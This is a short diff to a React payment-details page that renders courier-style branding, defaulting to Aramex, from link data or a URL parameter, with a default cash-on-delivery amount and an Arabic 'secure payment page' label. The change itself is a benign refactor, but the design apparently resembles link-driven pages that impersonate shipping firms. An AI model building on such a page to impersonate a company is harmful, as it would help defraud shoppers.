@@ -10,8 +10,9 @@ const PaymentDetails = () => {
   const navigate = useNavigate();
   const { data: linkData } = useLink(id);
   
-  const serviceName = linkData?.payload?.service_name || new URLSearchParams(window.location.search).get('service') || 'aramex';
-  const branding = getServiceBranding(serviceName);
+  const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
+  const serviceName = linkData?.payload?.service_name || serviceKey;
+  const branding = getServiceBranding(serviceKey);
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
@@ -23,6 +24,7 @@ const PaymentDetails = () => {
   return (
     <DynamicPaymentLayout
       serviceName={serviceName}
+      serviceKey={serviceKey}
       amount={formattedAmount}
       title="تفاصيل الدفع"
       description={`صفحة دفع آمنة ومحمية لخدمة ${serviceName}`}
